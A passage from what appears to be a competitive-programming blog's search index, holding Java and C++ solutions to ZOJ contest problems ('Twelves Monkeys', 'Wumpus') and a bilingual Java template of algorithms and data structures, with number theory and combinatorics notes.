que.add(source) ; Arrays.fill(dist, Integer.MAX_VALUE) ; dist[source] = 0 ; in[source] = true ; while(! que.isEmpty()){ int u = que.poll() ; in[u] = false ; for(int i = g[u] ; i &amp;gt; 0; i = e[i].next){ int v = e[i].v ; if(e[i].f &amp;gt; 0 &amp;amp;&amp;amp; dist[u] + e[i].w &amp;lt; dist[v]){ dist[v] = dist[u] + e[i].w ; pv[v] = u ; pe[v] = i ; if(! in[v]){ in[v] = true ; que.add(v) ; } } } } return dist[meet] &amp;lt; Integer.MAX_VALUE ; } int augment(){ int u = meet ; int delta = Integer.MAX_VALUE ; while(u != source){ delta = Math.min(delta , e[pe[u]].f) ; u = pv[u] ; } u = meet ; while(u != source){ e[pe[u]].f -= delta ; e[pe[u] ^ 1].f += delta ; u = pv[u] ; } return dist[meet] * delta ; } int mincostflow(){ int ans = 0 ; while(bfs()) ans += augment() ; return ans ; } } class InputReader{ public BufferedReader reader; public StringTokenizer tokenizer; public InputReader(InputStream stream){ reader = new BufferedReader(new InputStreamReader(stream), 32768); tokenizer = null; } public String next(){ while(tokenizer == null || !tokenizer.hasMoreTokens()){ try{ tokenizer = new StringTokenizer(reader.readLine()); }catch (IOException e) { throw new RuntimeException(e); } } return tokenizer.nextToken(); } public int nextInt() { return Integer.parseInt(next()); } public long nextLong() { return Long.parseLong(next()); } }[/code] H.Twelves Monkeys Time Limit: 5 Seconds Memory Limit: 32768 KB Problem DescriptionJames Cole is a convicted criminal living beneath a post-apocalyptic Philadelphia. Many years ago, the Earth’s surface had been contaminated by a virus so deadly that it forced the survivors to move underground. In the years that followed, scientists had engineered an imprecise form of time travel. To earn a pardon, Cole allows scientists to send him on dangerous missions to the past to collect information on the virus, thought to have been released by a terrorist organization known as the Army of the Twelve Monkeys.The time travel is powerful so that sicentists can send Cole from year x[i] back to year y[i]. Eventually, Cole finds that Goines is the founder of the Army of the Twelve Monkeys, and set out in search of him. When they find and confront him, however, Goines denies any involvement with the viruscan. After that, Cole goes back and tells scientists what he knew. He wants to quit the mission to enjoy life. He wants to go back to the any year before current year, but scientists only allow him to use time travel once. In case of failure, Cole will find at least one route for backup. Please help him to calculate how many years he can go with at least two routes. InputThe input file contains multiple test cases.The first line contains three integers n,m,q(1≤ n ≤ 50000, 1≤ m ≤ 50000, 1≤ q ≤ 50000), indicating the maximum year, the number of time travel path and the number of queries.The following m lines contains two integers x,y(1≤ y ≤ x ≤ 50000) indicating Cole can travel from year x to year y.The following q lines contains one integers p(1≤ p ≤ n) indicating the year Cole is at now OutputFor each test case, you should output one line, contain a number which is the total number of the year Cole can go. Sample Input9 3 39 16 14 1672 Sample Output501 Hint6 can go back to 1 for two route. One is 6-1, the other is 6-7-8-9-1. 6 can go back to 2 for two route. One is 6-1-2, the other is 6-7-8-9-1-2. 多好的静态区间查询啊，可是不好好写O(n)，写O(n^2)的就TLE。[code lang=”cpp”]vector&lt;pair&lt;int,int&gt; &gt; vec;int n,m,q; int bisearch(int key){ int l=1,r=m+1,mid=1,a; while(l&lt;r-1){ mid=(l+r)&gt;&gt;1; a=vec[mid-1].first; if (a&lt;=key) l=mid; else r=mid; } if (vec[l-1].first&lt;key) return l; return l-1; } int main(){ while(~scanf(&quot;%d%d%d&quot;,&amp;n,&amp;m,&amp;q)){ vec.clear(); for(int i=1;i&lt;=m;i++){ int u,v; scanf(&quot;%d%d&quot;,&amp;u,&amp;v); vec.push_back(make_pair(u,v)); } sort(vec.begin(),vec.end()); //for(int i=0;i&lt;m;i++) printf(&quot;%d:%d %d\\n&quot;,i+1,vec[i].first,vec[i].second); for(int i=1;i&lt;=q;i++){ int p; scanf(&quot;%d&quot;,&amp;p); int h=bisearch(p); if (m-h&lt;2){ puts(&quot;0&quot;); continue; } int min1,min2; min1=min2=p; for(int j=h;j&lt;m;j++){ int k=vec[j].second; if (k&lt;min1) { min2=min1;min1=k; } else min2=min(min2,k); } //sort(v.begin(),v.end()); printf(&amp;quot;%d\\n&amp;quot;,p-min2); } } return 0; }[/code]用线段树查询区间次小值也可行，但是从后往前处理跟方便，而且一次性完成。[code lang=”java”]/** 2015年7月30日 上午10:02:07 PrjName:zoj3888 @ Semprathlon/import java.io.;import java.util.*;public class Main { static int[][] f; final static int maxn=50010; static Vector&lt;Vector&lt;Integer&gt;&gt; a=new Vector&lt;Vector&lt;Integer&gt;&gt;(); public static void main(String[] args) throws IOException{// TODO Auto-generated method stub StreamTokenizer in=new StreamTokenizer(new BufferedInputStream(System.in)); PrintWriter out=new PrintWriter(System.out); for(int i=1;i&amp;lt;maxn;i++) a.add(new Vector&amp;lt;Integer&amp;gt;()); while(in.nextToken()!=StreamTokenizer.TT_EOF){ int n=(int)in.nval; in.nextToken(); int m=(int)in.nval; in.nextToken(); int q=(int)in.nval; for(int i=1;i&amp;lt;=n;i++) a.get(i-1).clear(); for(int i=1;i&amp;lt;=m;i++){ in.nextToken(); int u=(int)in.nval; in.nextToken(); int v=(int)in.nval; a.get(u-1).add(v); } f=new int[n+2][2]; f[n+1][0]=f[n+1][1]=n+1; for(int i=n;i&amp;gt;0;i--){ f[i][0]=Math.min(i, f[i+1][0]); f[i][1]=Math.min(i, f[i+1][1]); Vector&amp;lt;Integer&amp;gt; v=a.get(i-1); for(int j=0;j&amp;lt;v.size();j++) if (v.get(j)&amp;lt;=f[i][0]){ f[i][1]=f[i][0];f[i][0]=v.get(j); } else f[i][1]=Math.min(f[i][1], v.get(j)); } while(q--&amp;gt;0){ in.nextToken(); int p=(int)in.nval; out.println(p-f[p][1]); } } out.flush(); out.close(); } }[/code] J.Wumpus Time Limit: 2 Seconds Memory Limit: 65536 KB Problem DescriptionOne day Leon finds a very classic game called Wumpus.The game is as follow.Once an agent fell into a cave. The legend said that in this cave lived a kind of monster called Wumpus, and there were horrible pits which could lead to death everywhere. However, there were also a huge amount of gold in the cave. The agent must be careful and sensitive so that he could grab all of the gold and climb out of the cave safely.The cave can be regarded as a n*n board. In each square there could be a Wumpus, a pit, a brick of gold, or nothing. The agent would be at position (0,0) at first and headed right.(As the picture below)For each step, there are six possible movements including going forward, turning left, turning right, shooting, grabbing the gold, and climbing out of the cave. If the agent steps into a square containing a pit or Wumpus, he will die. When the agent shoots, the Wumpus in front of him will die. The goal of the agent is to grab all of the gold and return to the starting position and climb out(it’s OK if any Wumpus is still living).When a brick of gold is grabbed successfully, you will gain 1000 points. For each step you take, you will lose 10 points.Your job is to help him compute the highest point he can possibly get.For the purpose of simplification, we suppose that there is only one brick of gold and the agent cannot shoot the Wumpus.If there is a pit at (0, 0), the agent dies immediately. There will not be a Wumpus at (0, 0). InputThere are multiple cases. The first line will contain one integer k that indicates the number of cases.For each case:The first line will contain one integer n (n &lt; = 20).The following lines will contain three integers, each line shows a position of an object. The first one indicates the type of the object. 1 for Wumpus, 2 for pit and 3 for gold. Then the next two integers show the x and y coordinates of the object.The input end with -1 -1 -1. (It is guaranteed that no two things appear in one position.) OutputThe output contains one line with one integer, which is the highest point Leon could possibly get. If he cannot finish the game with a non-negative score, print “-1”. Sample Input231 1 12 2 03 2 2-1 -1 -131 1 13 2 2-1 -1 -1 Sample Output850870 HintFor the sample 1, the following steps are taken:turn left, forward, forward, turn right, forward, forward, grab, turn left, turn left, forward, forward, turn left, forward, forward, climb.There are in all 15 steps, so the final score is 840. For the sample 2 , the path is as follow: 一来一去的搜索……","link":"/posts/78189e73/"},{"title":"竞赛Java模板【dev-160504】","text":"Java Code Template By Semprathlon 部分理论知识引用自维基百科 Input 输入An enhanced InputReader supporting keeping reading data until the end of input while the number of input cases is unknown:一个加强版的输入器 ，支持读到输入文件末尾的方式，用法类似java.util.Scanner但效率显著提高: class InputReader { public BufferedReader reader; public StringTokenizer tokenizer; public InputReader(InputStream stream) { reader = new BufferedReader(new InputStreamReader(stream), 32768); tokenizer = null; } public boolean hasNext() { return tokenizer != null && tokenizer.hasMoreTokens() || nextLine() != null; } public String nextLine() { String tmp = null; try { tmp = reader.readLine(); tokenizer = new StringTokenizer(tmp); } catch (IOException e) { throw new RuntimeException(e); } catch (NullPointerException e) { return null; } return tmp; } public String next() { while (tokenizer == null || !tokenizer.hasMoreTokens()) { try { tokenizer = new StringTokenizer(reader.readLine()); } catch (IOException e) { throw new RuntimeException(e); } } return tokenizer.nextToken(); } public int nextInt() { return Integer.parseInt(next()); } public long nextLong() { return Long.parseLong(next()); } public double nextDouble() { return Double.parseDouble(next()); } } Keeping reading data until the end of input：读取数据直至文件末尾： import java.io.*; import java.util.*; public class Main { /** * @param args */ public static void main(String[] args) { // TODO Auto-generated method stub InputReader in = new InputReader(System.in); while (in.hasNext()) { // TODO ... } } } Output 输出import java.io.PrintWriter; PrintWriter out = new PrintWriter(System.out); // TODO ... out.flush(); // 更新缓冲区，使输出生效 out.close(); Data Structure 数据结构篇Pair 二元组 Pair.make_pair(TypeA left,TypeB right)可构造一个二元组对象并返回，不必指定类型。 比较大小时默认先比较left，若left相同则再比较right。 class Pair&lt;TypeA extends Comparable&lt;TypeA&gt;, TypeB extends Comparable&lt;TypeB&gt;&gt; implements Comparable&lt;Pair&lt;TypeA, TypeB&gt;&gt; { TypeA left; TypeB right; public Pair() { } public Pair(TypeA first, TypeB second) { left = first; right = second; } public static &amp;lt;TypeA extends Comparable&amp;lt;TypeA&amp;gt;, TypeB extends Comparable&amp;lt;TypeB&amp;gt;&amp;gt; Pair&amp;lt;TypeA, TypeB&amp;gt; make_pair( TypeA first, TypeB second) { return new Pair&amp;lt;TypeA, TypeB&amp;gt;(first, second); } public String toString() { return &quot;[&quot; + left.toString() + &quot;,&quot; + right.toString() + &quot;]&quot;; } boolean equals(Pair&amp;lt;TypeA, TypeB&amp;gt; p) { return this.left.equals(p.left) &amp;amp;&amp;amp; this.right.equals(p.right); } public int compareTo(Pair&amp;lt;TypeA, TypeB&amp;gt; p) { if (this.left.equals(p.left)) return this.right.compareTo(p.right); return this.left.compareTo(p.left); } }另一种比较器写法： class Pair_Comp&lt;TypeA extends Comparable&lt;TypeA&gt;, TypeB extends Comparable&lt;TypeB&gt;&gt; implements Comparator&lt;Pair&lt;TypeA, TypeB&gt;&gt; { public int compare(Pair&lt;TypeA, TypeB&gt; p1, Pair&lt;TypeA, TypeB&gt; p2) { return p1.compareTo(p2); } } Queue 队列Queue&lt;integer&gt; que=new LinkedList&lt;integer&gt;(); 用法详见SPFA等应用。 Priority Queue 优先队列 It is not recommended to use,for the constructor with the parameter of a comparator is supported since jdk 1.8. Queue&lt;Integer&gt; que=new PriorityQueue&lt;Integer&gt;(); Heap 堆This is a minimum heap:这是一个小根堆： class Heap { private int maxn; int[] data; int r; Heap(int size) { maxn=size; data = new int[maxn]; r = 0; } void clear(){ //Arrays.fill(data, 0); r=0; } public int size() { return r; } void swap(int a, int b) { int tmp = data[a]; data[a] = data[b]; data[b] = tmp; } void up(int p) { if (!(p &gt; 0)) return; int q = p &gt;&gt; 1; if (data[p] &lt; data[q]) { swap(p, q); up(q); } } void down(int p) { int q; if ((p &lt;&lt; 1) &gt;= r) return; else if ((p &lt;&lt; 1) == r - 1) { q = p &lt;&lt; 1; } else { q = (data[p &lt;&lt; 1] &lt; data[p &lt;&lt; 1 | 1] ? p &lt;&lt; 1 : p &lt;&lt; 1 | 1); } if (data[p] &gt; data[q]) { swap(p, q); down(q); } } void push(int n) { data[r++] = n; up(r - 1); } int pop() { int res = data[0]; swap(0, r - 1); r--; down(0); return res; } int top() { return data[0]; } } Directional edge 有向边class Edge { int v, f, w, nx; Edge() { } Edge(int _v, int _f, int _w, int _nx) { modify(_v, _f, _w, _nx); } void modify(int _v, int _f, int _w, int _nx) { v = _v; f = _f; w = _w; nx = _nx; } } Arc 弧适用于网络流模型中的有向边。 class Edge { int to, cap, flow, next; Edge() { } Edge(int _v, int _f, int _w, int _nx) { modify(_v, _f, _w, _nx); } void modify(int _v, int _f, int _w, int _nx) { to = _v; cap = _f; flow = _w; next = _nx; } }; Adjacent Table 链式前向星（邻接表）避免重复分配内存空间设计。addEdge根据具体需求修改。 class Graph { int[] h; int maxn, maxm; Edge[] e; int num; Graph(int _n, int _m) { maxn = _n; maxm = _m; h = new int[maxn]; e = new Edge[maxm]; for (int i = 0; i &lt; maxm; i++) e[i] = new Edge(); } void init() { Arrays.fill(h, -1); num = 0; } void addEdge(int u, int v, int f, int w) { e[num].modify(v, f, w, h[u]); h[u] = num++; e[num].modify(u, 0, -w, h[v]); h[v] = num++; } } ST table ST表RMQ 区间最值查询（静态，离线） void RMQ(){ //initializing-&gt;O(nlogn){ for(int i = 1; i != maxm; ++i) for(int j = 1; j &lt;= n; ++j) if(j + (1 &lt;&lt; i) - 1 &lt;= n){ maxsum[i][j] = Math.max(maxsum[i - 1][j], maxsum[i - 1][j + (1 &lt;&lt; i &gt;&gt; 1)]); minsum[i][j] = Math.min(minsum[i - 1][j], minsum[i - 1][j + (1 &lt;&lt; i &gt;&gt; 1)]); } } int query(int src,int des){ int k = (int)(Math.log(des - src + 1.0) / Math.log(2.0)); int maxres = Math.max(maxsum[k][src], maxsum[k][des - (1 &lt;&lt; k) + 1]); int minres = Math.min(minsum[k][src], minsum[k][des - (1 &lt;&lt; k) + 1]); return maxres-minres; } Segment Tree 线段树单点更新，区间求和。 class SegTree { int l, r, m; long val; SegTree L, R; SegTree() { } SegTree(int x, int y) { build(x, y); } void build(int x, int y) { int mi = (x + y) &gt;&gt; 1; l = x; r = y; m = mi; val = 0; if (x &lt; y) { if (L == null) L = new SegTree(x, m); else L.build(x, m); if (R == null) R = new SegTree(m + 1, y); else R.build(m + 1, y); } } void up() { val = L.val + R.val; } void add(int x, int v) { if (l == r) { val += v; return; } if (x &lt;= m) L.add(x, v); else if (x &gt; m) R.add(x, v); up(); } long query(int x, int y) { if (x &lt;= l &amp;&amp; r &lt;= y) { return val; } long res = 0; if (x &lt;= m) res += L.query(x, y); if (y &gt; m) res += R.query(x, y); return res; } } Binary Indexed Tree 树状数组Suppose there are n distinct integers ranging from $latex 1$ to $latex n$,and the $latex k$th largest one is required(use query(k-1)).假设有范围在$latex [1,n]$内的$latex n$个不同整数，求第$latex k$大的数（调用query(k-1)）。 class BIT { int[] data; int sz; BIT() { } BIT(int _sz) { sz = _sz; data = new int[sz + 1]; } int lowbit(int x) { return x & (-x); } void add(int p, int v) { while (p &lt;= sz) { data[p] += v; p += lowbit(p); } } int sum(int p) { int res = 0; while (p &gt; 0) { res += data[p]; p -= lowbit(p); } return res; } int find(int p) { int l = 1, r = sz; while (l &lt; r) { int mid = (l + r) &gt;&gt; 1; if (sum(mid) &lt;= p) l = mid + 1; else r = mid; } return l; } } Graph Theory 图论篇Topological Sorting 拓扑排序int[] degree; boolean[][] arc; Vector&lt;Integer&gt; ans; PriorityQueue&lt;Integer&gt; que; void Topo(int n) { for (int u = 1; u &lt;= n; u++) if (degree[u] == 0) { que.add(u); } while (!que.isEmpty()) { int u = que.poll(); ans.add(u); for (int v = 1; v &lt;= n; v++) { if (arc[u][v]) { degree[v]--; if (degree[v] == 0) { que.add(v); } } } } } Hungarian Algorithm 二分图最大匹配 - 匈牙利算法先初始化，再通过init执行清理。输入左点与右点个数之和与连接左点、右点之边，求最大匹配数。 class Hungary { private int n, maxn; private Vector&lt;Integer&gt;[] vec; private int[] match; private boolean[] vis; public Hungary(int _n) { maxn = _n; vec = new Vector[maxn]; for (int i = 0; i &lt; maxn; i++) vec[i] = new Vector&lt;Integer&gt;(); match = new int[maxn]; vis = new boolean[maxn]; } void init(int _n) { n = _n; for (int i = 0; i &lt; n; i++) vec[i].clear(); } void addEdge(int u, int v) { vec[u].add(v); vec[v].add(u); } boolean dfs(int v) { vis[v] = true; for (int i = 0; i &lt; vec[v].size(); i++) { int u = vec[v].get(i); int w = match[u]; if (w &lt; 0 || !vis[w] &amp;&amp; dfs(w)) { match[v] = u; match[u] = v; return true; } } return false; } int matching() { int res = 0; Arrays.fill(match, -1); for (int i = 0; i &lt; n; i++) if (match[i] &lt; 0) { Arrays.fill(vis, false); if (dfs(i)) res++; } return res; } } Hopcroft-Karp Algorithm 二分图最大匹配 - HK算法class HK { private int inf = 0x3fffffff; private int n, n1, n2, maxn; private Vector&lt;Integer&gt;[] vec; private int[] mx, my, dx, dy; private boolean[] vis; private Queue&lt;Integer&gt; que; private int dis; public HK(int _n) { maxn = _n; vec = new Vector[maxn]; for (int i = 0; i &lt; maxn; i++) vec[i] = new Vector&lt;Integer&gt;(); mx = new int[maxn]; my = new int[maxn]; vis = new boolean[maxn]; que = new LinkedList&lt;Integer&gt;(); dx = new int[maxn]; dy = new int[maxn]; } void init(int _n, int _n1, int _n2) { n = _n; n1 = _n1; n2 = _n2; for (int i = 0; i &lt; n; i++) vec[i].clear(); } void addEdge(int u, int v) { vec[u].add(v); vec[v].add(u); } boolean searchpath() { que.clear(); dis = inf; Arrays.fill(dx, -1); Arrays.fill(dy, -1); for (int i = 0; i &lt; n1; i++) { if (mx[i] == -1) { que.add(i); dx[i] = 0; } } while (!que.isEmpty()) { int u = que.poll(); if (dx[u] &gt; dis) break; for (int i = 0; i &lt; vec[u].size(); i++) { int v = vec[u].get(i); if (dy[v] == -1) { dy[v] = dx[u] + 1; if (my[v] == -1) dis = dy[v]; else { dx[my[v]] = dy[v] + 1; que.add(my[v]); } } } } return dis != inf; } boolean findpath(int u) { for (int i = 0; i &lt; vec[u].size(); i++) { int v = vec[u].get(i); if (!vis[v] &amp;&amp; dy[v] == dx[u] + 1) { vis[v] = true; if (my[v] != -1 &amp;&amp; dy[v] == dis) continue; if (my[v] == -1 || findpath(my[v])) { my[v] = u; mx[u] = v; return true; } } } return false; } int maxmatch() { int res = 0; Arrays.fill(mx, -1); Arrays.fill(my, -1); while (searchpath()) { Arrays.fill(vis, false); for (int i = 0; i &lt; n1; i++) if (mx[i] == -1) res += findpath(i) ? 1 : 0; } return res; } } SPFA最短路径先通过构造函数初始化，再通过init执行清理。 class spfa { final int inf = 0x3fffffff; private int maxn, maxm, src; public Graph g; private Queue&lt;Integer&gt; que; private boolean[] inQue; public int[] dis; public int[] prev, pree; public spfa(int _n, int _m) { maxn = _n; maxm = _m; dis = new int[maxn]; inQue = new boolean[maxn]; prev = new int[maxn]; pree = new int[maxn]; que = new LinkedList&lt;Integer&gt;(); } void init(Graph _g, int _u) { g = _g; src = _u; } void init(int _u) { if (g == null) g = new Graph(maxn, maxm); g.init(); src = _u; } void addEdge(int u, int v, int f, int w) { g.addEdge(u, v, f, w); } void solve() { que.clear(); que.add(src); Arrays.fill(dis, inf); dis[src] = 0; inQue[src] = true; while (!que.isEmpty()) { int u = que.poll(); for (int i = g.h[u]; i != -1; i = g.e[i].nx) { if (g.e[i].f &gt; 0 &amp;&amp; dis[u] + g.e[i].w &lt; dis[g.e[i].v]) { dis[g.e[i].v] = dis[u] + g.e[i].w; prev[g.e[i].v] = u; pree[g.e[i].v] = i; if (!inQue[g.e[i].v]) { inQue[g.e[i].v] = true; que.add(g.e[i].v); } } } inQue[u] = false; } } int get_res(int v) { solve(); return dis[v]; } } Number Theory 数论篇Extended Euclid Theorem 扩展欧几里得定理Suppose $latex ax+by=gcd(a,b) $,and the value of $latex x $ and of $latex y $ are required.已知$latex ax+by=gcd(a,b) $，求$latex x$与$latex y$的值。注意$latex x$与$latex y$中很可能有一个是负整数。 long x,y; void extgcd(long a, long b) { if (b == 0L) { x = 1L; y = 0L; return; } extgcd(b, a % b); long t = x; x = y; y = t - a / b * y; } Modular multiplicative inverse 模逆元$latex a^{-1} \\equiv b \\pmod{n},a \\cdot a^{-1} \\equiv 1 $.The modular multiplicative inverse of $latex a $ modulo $latex m $ can be found with the extended Euclidean algorithm.设exdgcd(a,n)为扩展欧几里得算法的函数，则可得到$latex ax+ny=gcd(a,n)$.若$latex g=1$，则该模逆元存在，根据结果$latex ax+ny=1$.在$latex \\mod{n}$之下，$latex ax+ny \\equiv ax \\equiv 1 $，根据模逆元的定义，此时$ x$即为$ a$关于模$ n$的其中一个模逆元。事实上，$latex x+kn(k \\in \\mathbb{Z}) $都是$latex a$关于模$latex n$的模逆元，这里取最小的正整数解$latex x\\mod{n} (x \\lt n) $。若$latex g\\ne 1$，则该模逆元不存在。 long cal_inv(long n, long mod) { extgcd(n, mod); return x &lt; 0L ? (x + mod) % mod : x % mod; } According to Euler’s theorem, if $latex a$ is coprime to $latex m$, that is, $latex gcd(a, m) = 1$, then $latex a^φ(m)≡1\\pmod{m}$,where $latex φ(m)$ is Euler’s totient function.$latex a^{φ(m)-1}≡a^{-1}\\pmod{m}$.In the special case when $latex m$ is a prime, the modular inverse is given by the below equation as: $latex a^{-1}≡a^{m-2}\\pmod{m}$.欧拉函数求单个逆元： long cal_inv(long n, long mod) { return pow_mod(n, phi[mod] - 1, mod); } 通过递推的方式，在线性时间复杂度内求出若干个逆元： void cal_inv(int maxn, long mod) { inv[1] = 1; for (int i = 2; i &lt; maxn; i++) inv[i] = (mod - mod / i) * inv[(int) (mod % i)] % mod; } Quick power and modulo 快速幂取模To calculate $latex n^m\\%mod $:计算$latex n^m\\%mod $： long pow_mod(long n, long m, long mod) { long res = 1L; n %= mod; while (m &gt; 0L) { if ((m & 1L) &gt; 0L) res = res * n % mod; n = n * n % mod; m &gt;&gt;= 1; } return res; } Multiply and modulo 乘法取模To calculate $latex nm\\%mod $:在$ n $和$ m $的值都较大，直接相乘会溢出的情况下，计算$latex nm\\%mod $： long mul_mod(long n, long m, long mod) { long ans = 0L; n %= mod; while (m &gt; 0L) { if ((m & 1L) &gt; 0L) ans = (ans + n) % mod; m &gt;&gt;= 1; n = (n + n) % mod; } return ans; } Division and modulo 除法取模To calculate $latex n/m\\%mod $ correctly ($latex mod$ is a prime number thus $latex φ(mod)=mod-1 $).利用欧拉函数计算$latex n/m\\%mod $（当$latex mod$是一个质数时有$latex φ(mod)=mod-1 $）： long div_mod(long n, long m, long mod) { return n * pow_mod(m, mod - 2, mod) % mod; // return n * pow_mod(m, phi(mod) - 1, mod) % mod; } In other words,use modular multiplicative inverse.或者直接使用模逆元： long div_mod(long n, long m, long mod) { return n * inv[(int) m] % mod; } Factorial and modulo 阶乘取模void Get_Fac(long n, long mod) { fac[0] = 1; for (int i = 1; i &lt;= n; i++) { fac[i] = fac[i - 1] * i; fac[i] %= mod; } } Prime filtering (linear) 线性筛质数int[] pri,fstp; void filter_prime(){ pri=new int[maxn]; fstp=new int[maxn]; for(int i=2;i&lt;maxn;i++){ if (fstp[i]==0){ pri[++pri[0]]=i; } for(int j=1;j&lt;=pri[0]&&i*pri[j]&lt;maxn;j++){ int k=i*pri[j]; fstp[k]=pri[j]; } } } Calculating Euler function $latex φ(n) $ 求欧拉函数值int[] pri,phi,fstp; void cal_euler(){ pri=new int[maxn]; fstp=new int[maxn]; phi=new int[maxn]; phi[1]=1; for(int i=2;i&lt;maxn;i++){ if (fstp[i]==0){ pri[++pri[0]]=i; phi[i]=i-1; } for(int j=1;j&lt;=pri[0]&&i*pri[j]&lt;maxn;j++){ int k=i*pri[j]; fstp[k]=pri[j]; if (i%pri[j]==0){ phi[k]=phi[i]*pri[j]; break; } else{ phi[k]=phi[i]*(pri[j]-1); } } } } Calculating Möbius function $latex μ(n) $ 求莫比乌斯函数值莫比乌斯函数$ μ(d) $的定义如下： 若$ d=1 $，那么$ μ(d)=1 $； 若$ d=p_1p_2…p_k $($ p_1…p_k $均为互异质数)，那么$ μ(d)=(−1)^k $； 其他情况下，$ μ(d)=0 $. int[] pri,fstp,miu; void cal_euler(){ pri=new int[maxn]; fstp=new int[maxn]; miu=new int[maxn]; miu[1]=1; for(int i=2;i&lt;maxn;i++){ if (fstp[i]==0){ pri[++pri[0]]=i; miu[i]=-1; } for(int j=1;j&lt;=pri[0]&&i*pri[j]&lt;maxn;j++){ int k=i*pri[j]; fstp[k]=pri[j]; if (i%pri[j]==0){ miu[k]=0; break; } else{ miu[k]=-miu[i]; } } } } Integer Prime Factorization 分解质因数Vector&lt;Integer&gt; get_prime_factor(int n){ Vector&lt;Integer&gt; res=new Vector&lt;Integer&gt;(); res.clear(); for(int i=2;i*i&lt;=n;i++) if (n%i==0){ res.add(i); while(n%i==0) n/=i; } if (n&gt;1) res.add(n); return res; } Quick Greatest Common Divisor 快速求最大公约数int kgcd(int a, int b) { if (a == 0) return b; if (b == 0) return a; if ((a & 1) == 0 && (b & 1) == 0) return kgcd(a &gt;&gt; 1, b &gt;&gt; 1) &lt;&lt; 1; else if ((b & 1) == 0) return kgcd(a, b &gt;&gt; 1); else if ((a & 1) == 0) return kgcd(a &gt;&gt; 1, b); else return kgcd(Math.abs(a - b), Math.min(a, b)); } Chinese Remainer Theorem 中国剩余定理Resolving $latex \\begin{cases} x ≡a_1 \\pmod{m_1}, \\newline x ≡a_2 \\pmod{m_2}, \\newline …, \\newline x ≡a_n \\pmod{m_n}. \\end{cases} $.解同余方程组$latex \\begin{cases} x ≡a_1 \\pmod{m_1}, \\newline x ≡a_2 \\pmod{m_2}, \\newline …, \\newline x ≡a_n \\pmod{m_n}. \\end{cases} $。 long CRT(long n, long[] a, long[] m) { long pro = 1L, res = 0L; for (int i = 0; i &lt; n; i++) pro *= m[i]; for (int i = 0; i &lt; n; i++) { long w = pro / m[i]; extgcd(m[i], w); res = (res + mul_mod(y, mul_mod(w, a[i], pro), pro)) % pro; } return (res + pro) % pro; } Combinatorial Mathematics 组合数学篇Combination Calculation #1 组合数计算1$latex C_n^m=C_{n-1}^m+C_{n-1}^{m-1}$. double[][] c; void init(){ c=new double[maxn][maxn]; c[0][0]=1; for(int i=1;i&lt;maxn;i++){ c[i][0]=c[i][i]=1; for(int j=1;j&lt;i;j++) c[i][j]=c[i-1][j]+c[i-1][j-1]; } } Combination Calculation #2 组合数计算2It is guaranteed that $latex n≥m$,but $latex n!$ should be computed in advance.在$latex n≥m$且$latex n!$已求出的前提下，单个计算$latex C_n^m$： long C(long n, long m, long mod) { int a = (int) (n % mod), b = (int) (m % mod); return div_mod(fac[a], mul_mod(fac[a - b], fac[b], mod), mod); } Lucas Theorem 卢卡斯定理C(n, m, mod) refers to $latex C_n^m\\%mod $.C(n, m, mod)表示$latex C_n^m\\%mod $。 如果有$ n = a_k p^k + a_{k-1} p^{k-1} + … + a_1 p + a_0 $,$ m = b_k p^k + b_{k-1} p^{k-1} + … + b_1 p + b_0 $,则$ C_n^m = \\prod_{i=0}^k C_{a_i}^{b_i}\\%p $. long Lucas(long n, long m, long mod) { long ret = 1L; while (n &gt; 0L && m &gt; 0L) { if (n % mod &lt; m % mod) return 0L; ret = mul_mod(ret, C(n, m, mod), mod); ret %= mod; n /= mod; m /= mod; } return ret; } Catalan number 卡塔兰数$latex C_n = {2n\\choose n} - {2n\\choose n+1} = {1\\over n+1}{2n\\choose n} \\quad\\text{ for }n\\ge 0$;The Catalan numbers satisfy the recurrence relation $latex C_0 = 1 \\quad \\mbox{and} \\quad C_{n+1}=\\sum_{i=0}^{n}C_i\\,C_{n-i}\\quad\\text{for }n\\ge 0$;moreover,$latex C_n= \\frac 1{n+1} \\sum_{i=0}^n {n \\choose i}^2$.Asymptotically, the Catalan numbers grow as $latex C_n \\sim \\frac{4^n}{n^{3/2}\\sqrt{\\pi}}$.组合数学中有非常多的组合结构可以用卡塔兰数来计数。 $latex C_n$表示长度2n的dyck word的个数。Dyck word是一个有n个X和n个Y组成的字串，且所有的前缀字串皆满足X的个数大于等于Y的个数。以下为长度为6的dyck words:XXXYYY XYXXYY XYXYXY XXYYXY XXYXYY 将上例的X换成左括号，Y换成右括号，$latex C_n$表示所有包含n组括号的合法运算式的个数：((())) ()(()) ()()() (())() (()()) $latex C_n$表示有n个节点组成不同构二叉树的方案数。 $latex C_n$表示有2n+1个节点组成不同构满二叉树（full binary tree）的方案数。 证明：令1表示进栈，0表示出栈，则可转化为求一个2n位、含n个1、n个0的二进制数，满足从左往右扫描到任意一位时，经过的0数不多于1数。显然含n个1、n个0的2n位二进制数共有$latex {2n \\choose n}$个，下面考虑不满足要求的数目。考虑一个含n个1、n个0的2n位二进制数，扫描到第2m+1位上时有m+1个0和m个1（容易证明一定存在这样的情况），则后面的0-1排列中必有n-m个1和n-m-1个0。将2m+2及其以后的部分0变成1、1变成0，则对应一个n+1个0和n-1个1的二进制数。反之亦然（相似的思路证明两者一一对应）。从而$latex C_n = {2n \\choose n} - {2n \\choose n + 1} = \\frac{1}{n+1}{2n \\choose n}$。证毕。 $latex C_n$表示所有在n × n格点中不越过对角线的单调路径的个数。一个单调路径从格点左下角出发，在格点右上角结束，每一步均为向上或向右。计算这种路径的个数等价于计算Dyck word的个数：X代表“向右”，Y代表“向上”。 $latex C_n$表示通过连结顶点而将n + 2边的凸多边形分成三角形的方法个数。 $latex C_n$表示对{1, …, n}依序进出栈的置换个数。一个置换w是依序进出栈的当S(w) = (1, …, n),其中S（w）递归定义如下：令w = unv，其中n为w的最大元素，u和v为更短的数列；再令S(w) = S(u)S(v)n，其中S为所有含一个元素的数列的单位元。 $latex C_n$表示集合{1, …, n}的不交叉划分的个数.那么, Cn永远不大于第n项贝尔数. Cn也表示集合{1, …, 2n}的不交叉划分的个数，其中每个段落的长度为2。 $latex C_n$表示用n个长方形填充一个高度为n的阶梯状图形的方法个数。 $latex C_n$表示表为2×n的矩阵的标准杨氏矩阵的数量。 也就是说，它是数字 1, 2, …, 2n 被放置在一个2×n的矩形中并保证每行每列的数字升序排列的方案数。同样的，该式可由勾长公式的一个特殊情形推导得出。 本例中使用递推公式$latex C_1=1,C_n=\\frac{(4n-2)}{(n+1)} \\cdot C_{n-1}$; long C[]; void get_Catalan(int maxn) { C[1] = 1; for (int i = 2; i &lt; maxn - 1; i++) { C[i] = C[i - 1] * ((i &lt;&lt; 2) - 2) % mod; C[i] = 